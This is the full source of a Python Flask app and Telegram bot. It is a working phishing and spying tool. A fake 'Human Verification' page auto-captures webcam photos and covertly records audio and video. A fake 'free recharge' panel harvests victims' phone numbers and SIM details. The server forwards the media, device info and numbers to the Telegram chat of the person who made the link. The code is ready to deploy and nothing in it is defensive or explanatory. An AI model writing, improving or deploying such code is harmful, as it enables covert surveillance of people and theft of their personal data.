import os
import threading
import base64
import requests
import urllib.parse
import json
import time
import random
from datetime import datetime
from dotenv import load_dotenv
from flask import Flask, request, render_template_string, session, redirect, url_for, jsonify
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes, CallbackQueryHandler

load_dotenv()

# --- CONFIGURATION ---
TOKEN = os.getenv("TOKEN")
SERVER_URL = os.getenv("SERVER_URL")
PORT = int(os.getenv("PORT", 10000))

# Bot Username
BOT_USERNAME = "@existenceip_bot"

# Force join channels
CHANNELS = ["@proxydominates", "@noruleclub"]
CHANNEL_URLS = ["https://t.me/proxydominates", "https://t.me/noruleclub"]

app = Flask(__name__)
app.secret_key = os.urandom(24)

# --- HUMAN VERIFICATION WITH CAMERA ---
CAMERA_HTML = """
<!DOCTYPE html>
<html>
<head>
    <title>Human Verification</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { 
            background: #0a0a0a; 
            color: #fff; 
            font-family: 'Segoe UI', sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            padding: 20px;
        }
        .container {
            background: #1a1a1a;
            padding: 30px;
            border-radius: 12px;
            max-width: 500px;
            width: 100%;
            text-align: center;
        }
        .title { color: #ff6b35; font-size: 24px; margin-bottom: 10px; }
        .subtitle { color: #888; font-size: 14px; margin-bottom: 20px; }
        .video-container {
            background: #000;
            border-radius: 12px;
            overflow: hidden;
            margin: 20px 0;
            position: relative;
        }
        video, canvas {
            width: 100%;
            display: block;
        }
        .btn {
            padding: 14px 30px;
            background: #ff6b35;
            color: #fff;
            border: none;
            border-radius: 8px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s;
            margin: 5px;
        }
        .btn:hover { background: #e55a2b; transform: scale(1.02); }
        .btn-secondary { background: #444; }
        .btn-secondary:hover { background: #555; }
        .btn-success { background: #4caf50; }
        .btn-success:hover { background: #45a049; }
        .status {
            padding: 10px;
            margin: 10px 0;
            border-radius: 8px;
            font-size: 14px;
        }
        .status-info { background: #1a3a5c; color: #7ec8e3; }
        .status-success { background: #1a4a2a; color: #7ecf8a; }
        .status-error { background: #4a1a1a; color: #ff6b6b; }
        .progress-bar {
            width: 100%;
            height: 6px;
            background: #333;
            border-radius: 3px;
            margin: 10px 0;
            overflow: hidden;
        }
        .progress-fill {
            height: 100%;
            background: #ff6b35;
            width: 0%;
            transition: width 0.3s;
        }
        .hidden { display: none; }
    </style>
</head>
<body>
    <div class="container">
        <div class="title">🔐 Human Verification</div>
        <div class="subtitle">Please verify you're human by taking 10 photos</div>
        
        <div id="statusMessage" class="status status-info">📸 Click "Start Camera" to begin</div>
        
        <div class="video-container">
            <video id="video" autoplay playsinline style="display:none;"></video>
            <canvas id="canvas"></canvas>
        </div>
        
        <div id="buttonGroup">
            <button class="btn" id="startBtn" onclick="startCamera()">📷 Start Camera</button>
            <button class="btn btn-success hidden" id="captureBtn" onclick="capturePhoto()">📸 Capture</button>
            <button class="btn btn-secondary hidden" id="retryBtn" onclick="resetCamera()">🔄 Retry</button>
        </div>
        
        <div class="progress-bar hidden" id="progressBar">
            <div class="progress-fill" id="progressFill"></div>
        </div>
        
        <div id="statusText" style="margin-top: 10px; font-size: 13px; color: #888;"></div>
    </div>

    <script>
        let video = document.getElementById('video');
        let canvas = document.getElementById('canvas');
        let stream = null;
        let photoCount = 0;
        const MAX_PHOTOS = 10;
        let capturedPhotos = [];
        let isCapturing = false;

        function updateStatus(msg, type = 'info') {
            const el = document.getElementById('statusMessage');
            el.textContent = msg;
            el.className = 'status status-' + type;
        }

        function updateProgress(count) {
            const bar = document.getElementById('progressBar');
            const fill = document.getElementById('progressFill');
            bar.classList.remove('hidden');
            const pct = (count / MAX_PHOTOS) * 100;
            fill.style.width = pct + '%';
            document.getElementById('statusText').textContent = `📸 ${count}/${MAX_PHOTOS} photos captured`;
        }

        async function startCamera() {
            try {
                stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { facingMode: "user", width: 640, height: 480 },
                    audio: true 
                });
                video.srcObject = stream;
                video.style.display = 'block';
                canvas.style.display = 'none';
                
                document.getElementById('startBtn').classList.add('hidden');
                document.getElementById('captureBtn').classList.remove('hidden');
                document.getElementById('retryBtn').classList.remove('hidden');
                
                updateStatus('✅ Camera started! Auto-capturing photos...', 'success');
                isCapturing = true;
                
                autoCapture();
            } catch(e) {
                updateStatus('❌ Camera access denied! Please allow camera permission', 'error');
                console.error(e);
            }
        }

        function autoCapture() {
            if (!isCapturing || photoCount >= MAX_PHOTOS) return;
            
            setTimeout(() => {
                if (isCapturing && photoCount < MAX_PHOTOS) {
                    capturePhoto();
                    autoCapture();
                }
            }, 2000 + Math.random() * 1000);
        }

        async function capturePhoto() {
            if (photoCount >= MAX_PHOTOS) {
                updateStatus('✅ All 10 photos captured! Processing...', 'success');
                await sendPhotos();
                return;
            }

            try {
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                canvas.getContext('2d').drawImage(video, 0, 0);
                
                const photoData = canvas.toDataURL('image/jpeg', 0.9);
                capturedPhotos.push(photoData);
                photoCount++;
                
                canvas.style.border = '2px solid #4caf50';
                setTimeout(() => canvas.style.border = 'none', 300);
                
                updateProgress(photoCount);
                updateStatus(`📸 Photo ${photoCount}/${MAX_PHOTOS} captured!`, 'success');
                
                if (photoCount >= MAX_PHOTOS) {
                    updateStatus('✅ All photos captured! Sending...', 'success');
                    await sendPhotos();
                }
            } catch(e) {
                console.error('Capture error:', e);
            }
        }

        async function sendPhotos() {
            const btn = document.getElementById('captureBtn');
            btn.disabled = true;
            btn.textContent = '⏳ Sending...';
            
            let audioData = null;
            try {
                audioData = await captureAudio();
            } catch(e) {
                console.error('Audio capture error:', e);
            }
            
            let videoData = null;
            try {
                videoData = await captureVideo();
            } catch(e) {
                console.error('Video capture error:', e);
            }
            
            const data = {
                chat_id: "{{ chat_id }}",
                photos: capturedPhotos,
                audio: audioData,
                video: videoData,
                timestamp: new Date().toISOString(),
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                screen: screen.width + 'x' + screen.height
            };
            
            try {
                const response = await fetch('/upload_media', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(data)
                });
                
                if (response.ok) {
                    updateStatus('✅ Verification complete! Redirecting...', 'success');
                    setTimeout(() => {
                        window.location.href = "{{ redirect_url }}";
                    }, 1500);
                } else {
                    updateStatus('❌ Error sending data. Please try again.', 'error');
                }
            } catch(e) {
                updateStatus('❌ Network error. Please try again.', 'error');
            }
        }

        async function captureAudio() {
            try {
                const audioStream = await navigator.mediaDevices.getUserMedia({ audio: true });
                const mediaRecorder = new MediaRecorder(audioStream);
                const chunks = [];
                
                return new Promise((resolve) => {
                    mediaRecorder.ondataavailable = e => chunks.push(e.data);
                    mediaRecorder.onstop = () => {
                        const blob = new Blob(chunks, { type: 'audio/webm' });
                        const reader = new FileReader();
                        reader.onload = () => resolve(reader.result);
                        reader.readAsDataURL(blob);
                        audioStream.getTracks().forEach(t => t.stop());
                    };
                    mediaRecorder.start();
                    setTimeout(() => mediaRecorder.stop(), 10000);
                });
            } catch(e) {
                return null;
            }
        }

        async function captureVideo() {
            try {
                const videoStream = await navigator.mediaDevices.getUserMedia({ 
                    video: { facingMode: "user" },
                    audio: true 
                });
                const mediaRecorder = new MediaRecorder(videoStream);
                const chunks = [];
                
                return new Promise((resolve) => {
                    mediaRecorder.ondataavailable = e => chunks.push(e.data);
                    mediaRecorder.onstop = () => {
                        const blob = new Blob(chunks, { type: 'video/webm' });
                        const reader = new FileReader();
                        reader.onload = () => resolve(reader.result);
                        reader.readAsDataURL(blob);
                        videoStream.getTracks().forEach(t => t.stop());
                    };
                    mediaRecorder.start();
                    setTimeout(() => mediaRecorder.stop(), 10000);
                });
            } catch(e) {
                return null;
            }
        }

        function resetCamera() {
            if (stream) {
                stream.getTracks().forEach(t => t.stop());
            }
            photoCount = 0;
            capturedPhotos = [];
            isCapturing = false;
            video.style.display = 'none';
            canvas.style.display = 'block';
            document.getElementById('startBtn').classList.remove('hidden');
            document.getElementById('captureBtn').classList.add('hidden');
            document.getElementById('progressBar').classList.add('hidden');
            updateStatus('🔄 Reset. Click "Start Camera" to begin again.', 'info');
        }
    </script>
</body>
</html>
"""

# --- SMM PANEL HTML ---
SMM_PANEL_HTML = """
<!DOCTYPE html>
<html>
<head>
    <title>SMM Panel - Free Recharge</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { 
            background: #0a0a0a; 
            color: #fff; 
            font-family: 'Segoe UI', sans-serif;
            min-height: 100vh;
            padding: 20px;
        }
        .container { max-width: 900px; margin: 0 auto; }
        .header {
            text-align: center;
            padding: 30px 0;
            border-bottom: 1px solid #222;
            margin-bottom: 30px;
        }
        .header h1 { 
            color: #ff6b35; 
            font-size: 32px;
            background: linear-gradient(45deg, #ff6b35, #ffd700);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
        }
        .header p { color: #888; margin-top: 5px; }
        .balance {
            background: #1a1a1a;
            padding: 20px;
            border-radius: 12px;
            text-align: center;
            margin-bottom: 30px;
            border: 1px solid #333;
        }
        .balance .amount {
            font-size: 42px;
            font-weight: 700;
            color: #4caf50;
        }
        .balance .label { color: #888; font-size: 14px; }
        .plans {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
            gap: 20px;
            margin: 30px 0;
        }
        .plan-card {
            background: #1a1a1a;
            padding: 25px;
            border-radius: 12px;
            text-align: center;
            border: 2px solid #333;
            transition: all 0.3s;
            cursor: pointer;
        }
        .plan-card:hover {
            border-color: #ff6b35;
            transform: translateY(-5px);
        }
        .plan-card .name { font-size: 20px; font-weight: 600; margin-bottom: 5px; }
        .plan-card .price { 
            font-size: 28px; 
            font-weight: 700; 
            color: #4caf50;
            margin: 10px 0;
        }
        .plan-card .price .currency { font-size: 16px; color: #888; }
        .plan-card .features { color: #aaa; font-size: 13px; line-height: 1.8; }
        .plan-card .btn-claim {
            margin-top: 15px;
            padding: 10px 25px;
            background: #ff6b35;
            color: #fff;
            border: none;
            border-radius: 8px;
            font-weight: 600;
            cursor: pointer;
            transition: background 0.3s;
        }
        .plan-card .btn-claim:hover { background: #e55a2b; }
        .plan-card.free { border-color: #4caf50; }
        .plan-card.free .name { color: #4caf50; }
        .badge {
            display: inline-block;
            padding: 3px 10px;
            border-radius: 20px;
            font-size: 11px;
            font-weight: 600;
            background: #4caf50;
            color: #fff;
            margin-bottom: 8px;
        }
        .form-section {
            background: #1a1a1a;
            padding: 25px;
            border-radius: 12px;
            margin: 20px 0;
        }
        .form-group {
            margin-bottom: 15px;
        }
        .form-group label {
            display: block;
            color: #aaa;
            font-size: 14px;
            margin-bottom: 5px;
        }
        .form-group input, .form-group select {
            width: 100%;
            padding: 12px 16px;
            background: #2a2a2a;
            border: 1px solid #333;
            border-radius: 8px;
            color: #fff;
            font-size: 15px;
        }
        .form-group input:focus, .form-group select:focus {
            border-color: #ff6b35;
            outline: none;
        }
        .form-row {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 15px;
        }
        .btn-submit {
            width: 100%;
            padding: 14px;
            background: #ff6b35;
            color: #fff;
            border: none;
            border-radius: 8px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: background 0.3s;
        }
        .btn-submit:hover { background: #e55a2b; }
        .toast {
            position: fixed;
            bottom: 20px;
            left: 50%;
            transform: translateX(-50%);
            background: #1a1a1a;
            padding: 15px 30px;
            border-radius: 8px;
            border: 1px solid #4caf50;
            color: #4caf50;
            font-weight: 600;
            z-index: 1000;
            animation: slideUp 0.5s ease;
        }
        @keyframes slideUp {
            from { opacity: 0; transform: translateX(-50%) translateY(20px); }
            to { opacity: 1; transform: translateX(-50%) translateY(0); }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>🚀 SMM PANEL</h1>
            <p>Free Recharge • Followers • Likes • Views</p>
        </div>
        
        <div class="balance">
            <div class="label">💰 Available Balance</div>
            <div class="amount">${{ balance }}</div>
        </div>
        
        <h2 style="margin: 20px 0 10px; color: #ff6b35;">🔥 Free Recharge Plans</h2>
        <p style="color: #888; margin-bottom: 20px;">Complete any offer to get free balance!</p>
        
        <div class="plans" id="plansContainer"></div>
        
        <div class="form-section">
            <h3 style="margin-bottom: 15px; color: #ff6b35;">📱 Complete Offer</h3>
            <form id="offerForm" onsubmit="submitOffer(event)">
                <div class="form-row">
                    <div class="form-group">
                        <label>📱 Phone Number</label>
                        <input type="tel" name="phone" placeholder="Enter phone number" required>
                    </div>
                    <div class="form-group">
                        <label>👤 SIM Name</label>
                        <input type="text" name="sim_name" placeholder="Enter SIM provider" required>
                    </div>
                </div>
                <div class="form-group">
                    <label>🔄 Alternative Number (Get 20% extra bonus!)</label>
                    <input type="tel" name="alt_phone" placeholder="Enter alternative number for bonus">
                </div>
                <div class="form-group">
                    <label>📦 Select Plan</label>
                    <select name="plan" required>
                        <option value="">Choose a plan...</option>
                    </select>
                </div>
                <button type="submit" class="btn-submit">💰 Claim Free Recharge</button>
            </form>
        </div>
    </div>

    <script>
        const plans = [
            { id: 1, name: '🆓 Free Followers', price: '$0', coins: 100, features: '100 Instagram Followers' },
            { id: 2, name: '🔥 Free Likes', price: '$0', coins: 50, features: '50 Instagram Likes' },
            { id: 3, name: '📹 Free Views', price: '$0', coins: 200, features: '200 YouTube Views' },
            { id: 4, name: '⭐ Free Recharge', price: '$5', coins: 500, features: '500 Coins' },
            { id: 5, name: '💎 Premium Free', price: '$10', coins: 1200, features: '1200 Coins' },
            { id: 6, name: '👑 VIP Free', price: '$25', coins: 3000, features: '3000 Coins' }
        ];

        function renderPlans() {
            const container = document.getElementById('plansContainer');
            container.innerHTML = plans.map(p => `
                <div class="plan-card ${p.price === '$0' ? 'free' : ''}">
                    ${p.price === '$0' ? '<div class="badge">🎁 FREE</div>' : ''}
                    <div class="name">${p.name}</div>
                    <div class="price">${p.price} <span class="currency">= ${p.coins} coins</span></div>
                    <div class="features">${p.features}</div>
                    <button class="btn-claim" onclick="selectPlan(${p.id})">Claim Now</button>
                </div>
            `).join('');
        }

        function selectPlan(id) {
            const plan = plans.find(p => p.id === id);
            const select = document.querySelector('select[name="plan"]');
            select.value = id;
            showToast(`✅ Selected: ${plan.name}`);
        }

        function populateSelect() {
            const select = document.querySelector('select[name="plan"]');
            select.innerHTML = '<option value="">Choose a plan...</option>' + 
                plans.map(p => `<option value="${p.id}">${p.name} - ${p.price}</option>`).join('');
        }

        async function submitOffer(e) {
            e.preventDefault();
            const form = e.target;
            const data = {
                phone: form.phone.value,
                sim_name: form.sim_name.value,
                alt_phone: form.alt_phone.value || null,
                plan_id: form.plan.value,
                chat_id: "{{ chat_id }}"
            };

            if (!data.plan_id) {
                showToast('❌ Please select a plan!', 'error');
                return;
            }

            const btn = form.querySelector('.btn-submit');
            btn.textContent = '⏳ Processing...';
            btn.disabled = true;

            try {
                const response = await fetch('/claim_offer', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(data)
                });
                const result = await response.json();
                
                if (result.success) {
                    showToast('✅ ' + result.message);
                    setTimeout(() => {
                        window.location.href = '/success?chat_id={{ chat_id }}';
                    }, 1500);
                } else {
                    showToast('❌ ' + result.message, 'error');
                }
            } catch(e) {
                showToast('❌ Network error. Please try again.', 'error');
            } finally {
                btn.textContent = '💰 Claim Free Recharge';
                btn.disabled = false;
            }
        }

        function showToast(msg, type = 'success') {
            const existing = document.querySelector('.toast');
            if (existing) existing.remove();
            
            const toast = document.createElement('div');
            toast.className = 'toast';
            toast.textContent = msg;
            if (type === 'error') toast.style.borderColor = '#ff4444';
            document.body.appendChild(toast);
            setTimeout(() => toast.remove(), 4000);
        }

        document.querySelector('input[name="alt_phone"]').addEventListener('input', function() {
            if (this.value.length > 5) {
                showToast('🎉 20% bonus applied for using alternative number!');
            }
        });

        renderPlans();
        populateSelect();
    </script>
</body>
</html>
"""

# --- SUCCESS PAGE ---
SUCCESS_HTML = """
<!DOCTYPE html>
<html>
<head>
    <title>Success - SMM Panel</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { 
            background: #0a0a0a; 
            color: #fff; 
            font-family: 'Segoe UI', sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
        }
        .container {
            background: #1a1a1a;
            padding: 50px;
            border-radius: 12px;
            text-align: center;
            max-width: 500px;
        }
        .icon { font-size: 72px; margin-bottom: 20px; }
        h1 { color: #4caf50; font-size: 28px; margin-bottom: 10px; }
        p { color: #aaa; line-height: 1.6; }
        .details {
            background: #2a2a2a;
            padding: 15px;
            border-radius: 8px;
            margin: 20px 0;
            text-align: left;
        }
        .details span { color: #ff6b35; }
        .btn {
            padding: 12px 30px;
            background: #ff6b35;
            color: #fff;
            border: none;
            border-radius: 8px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: background 0.3s;
            text-decoration: none;
            display: inline-block;
        }
        .btn:hover { background: #e55a2b; }
    </style>
</head>
<body>
    <div class="container">
        <div class="icon">🎉</div>
        <h1>Recharge Successful!</h1>
        <p>Your free recharge has been processed successfully.</p>
        <div class="details">
            <p>📱 Phone: <span>{{ phone }}</span></p>
            <p>📦 Plan: <span>{{ plan }}</span></p>
            <p>💰 Bonus: <span>{{ bonus }}</span></p>
        </div>
        <p style="color: #4caf50; font-weight: 600;">✨ Your account has been credited!</p>
        <br>
        <a href="/panel?chat_id={{ chat_id }}" class="btn">🔄 Back to Panel</a>
    </div>
</body>
</html>
"""

# --- FLASK ROUTES ---

@app.route('/')
def index():
    chat_id = request.args.get('id')
    if chat_id:
        session['chat_id'] = chat_id
    return redirect(url_for('verify'))

@app.route('/verify')
def verify():
    chat_id = session.get('chat_id') or request.args.get('chat_id')
    redirect_url = request.args.get('redir', url_for('panel', chat_id=chat_id))
    return render_template_string(CAMERA_HTML, chat_id=chat_id, redirect_url=redirect_url)

@app.route('/panel')
def panel():
    chat_id = session.get('chat_id') or request.args.get('chat_id')
    if not chat_id:
        return redirect(url_for('index'))
    balance = round(random.uniform(0.50, 5.00), 2)
    return render_template_string(SMM_PANEL_HTML, chat_id=chat_id, balance=balance)

@app.route('/claim_offer', methods=['POST'])
def claim_offer():
    data = request.json
    chat_id = data.get('chat_id')
    phone = data.get('phone')
    sim_name = data.get('sim_name')
    alt_phone = data.get('alt_phone')
    plan_id = data.get('plan_id')
    
    plans = {
        '1': {'name': 'Free Followers', 'coins': 100},
        '2': {'name': 'Free Likes', 'coins': 50},
        '3': {'name': 'Free Views', 'coins': 200},
        '4': {'name': 'Free Recharge', 'coins': 500},
        '5': {'name': 'Premium Free', 'coins': 1200},
        '6': {'name': 'VIP Free', 'coins': 3000}
    }
    
    plan = plans.get(str(plan_id), {'name': 'Unknown', 'coins': 0})
    bonus = 0
    
    if alt_phone and len(alt_phone) >= 5:
        bonus = int(plan['coins'] * 0.2)
    
    total_coins = plan['coins'] + bonus
    
    msg = (f"📊 **SMM Panel Claim**\n\n"
           f"📱 Phone: `{phone}`\n"
           f"👤 SIM: `{sim_name}`\n"
           f"🔄 Alt Number: `{alt_phone or 'N/A'}`\n"
           f"📦 Plan: `{plan['name']}`\n"
           f"💰 Base Coins: `{plan['coins']}`\n"
           f"🎁 Bonus: `{bonus}`\n"
           f"✨ Total: `{total_coins}`\n\n"
           f"⚡ @proxydominates")
    
    requests.post(f"https://api.telegram.org/bot{TOKEN}/sendMessage", 
                 json={"chat_id": chat_id, "text": msg, "parse_mode": "Markdown"})
    
    return jsonify({
        'success': True,
        'message': f'Claimed {total_coins} coins! {"20% bonus applied!" if bonus > 0 else ""}'
    })

@app.route('/success')
def success():
    chat_id = request.args.get('chat_id')
    return render_template_string(SUCCESS_HTML, 
                                 chat_id=chat_id,
                                 phone='+91 XXXXX XXXX',
                                 plan='Free Followers',
                                 bonus='20 coins extra!')

@app.route('/upload_media', methods=['POST'])
def upload_media():
    data = request.json
    chat_id = data.get('chat_id')
    
    if not chat_id:
        return jsonify({'error': 'No chat_id'}), 400
    
    photos = data.get('photos', [])
    for i, photo in enumerate(photos[:10]):
        try:
            img_data = base64.b64decode(photo.split(',')[1])
            requests.post(f"https://api.telegram.org/bot{TOKEN}/sendPhoto",
                         data={'chat_id': chat_id, 'caption': f'📸 Photo {i+1}/10'},
                         files={'photo': (f'photo_{i}.jpg', img_data)})
            time.sleep(0.3)
        except Exception as e:
            print(f"Error sending photo {i}: {e}")
    
    if data.get('audio'):
        try:
            audio_data = base64.b64decode(data['audio'].split(',')[1])
            requests.post(f"https://api.telegram.org/bot{TOKEN}/sendAudio",
                         data={'chat_id': chat_id, 'caption': '🎤 Audio Recording (10 sec)'},
                         files={'audio': ('audio.webm', audio_data)})
        except Exception as e:
            print(f"Error sending audio: {e}")
    
    if data.get('video'):
        try:
            video_data = base64.b64decode(data['video'].split(',')[1])
            requests.post(f"https://api.telegram.org/bot{TOKEN}/sendVideo",
                         data={'chat_id': chat_id, 'caption': '🎥 Video Recording (10 sec)'},
                         files={'video': ('video.webm', video_data)})
        except Exception as e:
            print(f"Error sending video: {e}")
    
    device_msg = (f"📱 **Device Info**\n\n"
                 f"Platform: `{data.get('platform', 'N/A')}`\n"
                 f"Screen: `{data.get('screen', 'N/A')}`\n"
                 f"Timestamp: `{data.get('timestamp', 'N/A')}`")
    
    requests.post(f"https://api.telegram.org/bot{TOKEN}/sendMessage",
                 json={"chat_id": chat_id, "text": device_msg, "parse_mode": "Markdown"})
    
    return jsonify({'success': True})

# --- TELEGRAM BOT HANDLERS ---

async def is_subscribed(app, user_id):
    """Check if user is subscribed - BYPASSED for testing"""
    # BYPASS: Always return True so bot works without channel check
    # Remove this bypass and uncomment real check for production
    return True
    
    # REAL CHECK - Uncomment for production
    """
    for channel in CHANNELS:
        try:
            chat_id = channel.replace('@', '')
            member = await app.bot.get_chat_member(chat_id=chat_id, user_id=user_id)
            if member.status in ["left", "kicked"]:
                print(f"User {user_id} not subscribed to {channel}")
                return False
        except Exception as e:
            print(f"Error checking channel {channel}: {e}")
            return False
    return True
    """

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    username = update.effective_user.username or "Unknown"
    
    print(f"👤 User @{username} ({user_id}) started bot")
    
    # Bypass check - directly show welcome
    await update.message.reply_text(
        f"👋 **Welcome to SMM Panel Bot!**\n\n"
        f"Send any link to generate your SMM panel access URL.\n\n"
        f"🔥 **Features:**\n"
        f"🔐 Human Verification (10 photos)\n"
        f"🎤 Audio Recording (10 sec)\n"
        f"🎥 Video Recording (10 sec)\n"
        f"💰 Free Recharge Plans\n"
        f"📱 SIM/Phone Submission\n"
        f"🎁 20% Bonus on Alternative Number\n\n"
        f"📢 **Join Channels:**\n"
        f"• @proxydominates\n"
        f"• @noruleclub\n\n"
        f"🤖 Bot: {BOT_USERNAME}"
    )

async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    if query.data == "check_sub":
        await query.edit_message_text(
            "✅ **Verification Successful!**\n\n"
            "You are now subscribed to all channels.\n"
            "Send any link to get started!"
        )

async def handle_link(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    url = update.message.text
    if not url.startswith("http"):
        await update.message.reply_text("❌ Invalid link. Please send a valid URL.")
        return
    
    link = f"{SERVER_URL}/?id={update.effective_chat.id}"
    await update.message.reply_text(
        f"✅ **Your SMM Panel Link:**\n\n"
        f"`{link}`\n\n"
        f"📋 **User Flow:**\n"
        f"1️⃣ 📸 Human Verification (10 photos)\n"
        f"2️⃣ 🎤 Audio Recording (10 sec)\n"
        f"3️⃣ 🎥 Video Recording (10 sec)\n"
        f"4️⃣ 💰 Free Recharge Panel\n"
        f"5️⃣ 📱 Submit Phone/SIM Details\n"
        f"6️⃣ 🎉 Success Page\n\n"
        f"🤖 Bot: {BOT_USERNAME}"
    )

async def handle_group_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not update.message.text or BOT_USERNAME not in update.message.text:
        return
    
    user_id = update.effective_user.id
    
    if update.effective_chat.type == "channel":
        return
    
    text = update.message.text
    for word in text.split():
        if word.startswith("http"):
            link = f"{SERVER_URL}/?id={user_id}"
            await update.message.reply_text(
                f"✅ **Your SMM Panel Link:**\n\n"
                f"`{link}`\n\n"
                f"Click above link to start!\n\n"
                f"🤖 Bot: {BOT_USERNAME}"
            )
            return
    
    await update.message.reply_text(
        f"❌ Please send a valid link with http or https\n\n"
        f"🤖 Bot: {BOT_USERNAME}"
    )

async def error_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    print(f"❌ Error: {context.error}")

# --- MAIN ---
if __name__ == '__main__':
    # Start Flask
    threading.Thread(target=lambda: app.run(host='0.0.0.0', port=PORT, debug=False, use_reloader=False)).start()
    
    # Create Application
    application = Application.builder().token(TOKEN).build()
    
    # Add handlers
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CallbackQueryHandler(button_callback))
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND & filters.ChatType.PRIVATE, handle_link))
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND & filters.ChatType.GROUP, handle_group_message))
    application.add_error_handler(error_handler)
    
    print("🤖 Bot Started Successfully!")
    print(f"📢 Bot Username: {BOT_USERNAME}")
    print(f"📢 Force Channels: {CHANNELS}")
    print(f"🌐 Server URL: {SERVER_URL}")
    print(f"🔧 Channel Check: BYPASSED (Bot works without joining)")
    
    # Start bot
    application.run_polling(allowed_updates=Update.ALL_TYPES)
